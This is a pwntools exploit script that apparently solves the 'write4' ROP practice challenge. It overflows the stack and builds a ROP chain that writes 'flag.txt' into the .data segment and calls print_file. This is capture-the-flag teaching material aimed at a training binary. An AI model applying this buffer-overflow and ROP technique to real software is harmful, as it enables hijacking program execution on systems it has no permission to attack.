from pwn import *

binary = context.binary = ELF("./write4", checksec=True)
p = process(binary.path)

# debug shit
#context.log_level="debug"
#gdbscript = "b *0x400628"
#pid = gdb.attach(p, gdbscript=gdbscript)

# ROP chain payload creation
rop = ROP(p.elf)
padding = b"\x90" * 40       # overwrite RSP
write_gadget = p64(0x400628) # mov qword ptr [r14], r15 ; ret
pop_rdi = p64(rop.search(move=0,regs=["rdi"]).address)  # pop rdi ; ret
pop_r14_r15 = p64(rop.search(move=0,regs=["r14", "r15"]).address) # pop r14 ; pop r15 ; ret


flag = b"flag.txt"
for index_location, char in enumerate(flag):
	writeable = p64(0x00601028 + index_location)  # -rw- .data segment
	rop.raw(pop_r14_r15)
	rop.raw(writeable)
	rop.raw(char)
	rop.raw(write_gadget)

rop.raw(pop_rdi)
rop.raw(p64(0x00601028)) # writeable segment
rop.raw(p64(p.elf.plt["print_file"]))

# form payload
payload = b"".join([padding, rop.chain()])

# write payload into file
#with open("payload.txt", "wb") as file:
#	file.write(payload)

# clean & send payload then start interactive session if you want
p.clean()
p.sendline(payload)
#p.interactive()
print(p.recvall())

